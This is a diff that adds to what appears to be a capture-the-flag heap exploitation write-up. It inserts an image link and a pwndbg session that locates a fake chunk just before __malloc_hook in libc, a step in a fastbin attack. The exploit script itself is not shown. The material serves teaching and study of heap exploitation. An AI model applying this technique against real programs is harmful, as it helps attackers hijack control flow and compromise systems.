@@ -135,6 +135,23 @@ undefined8 deleteHeap(void)
 ___
 ### Exploit:
 
+![image](images/heap2/random1.png)
+
+```asm
+pwndbg> p/x 0x7f5e2219bb10 - 0x23
+$9 = 0x7f5e2219baed
+pwndbg> x/4gx  0x7f5e2219baed
+0x7f5e2219baed <_IO_wide_data_0+301>:   0x5e2219a260000000      0x000000000000007f
+0x7f5e2219bafd: 0x5e21e79b00000000      0x5e21e79aa000007f
+pwndbg> 
+0x7f5e2219bb0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
+0x7f5e2219bb1d: 0x0100000000000000      0x0000000000000000
+pwndbg> 
+0x7f5e2219bb2d <main_arena+13>: 0x0000000000000000      0x0000000000000000
+0x7f5e2219bb3d <main_arena+29>: 0x0000000000000000      0x0000000000000000
+```
+
+
 ___
 `script.py`:
 ```python
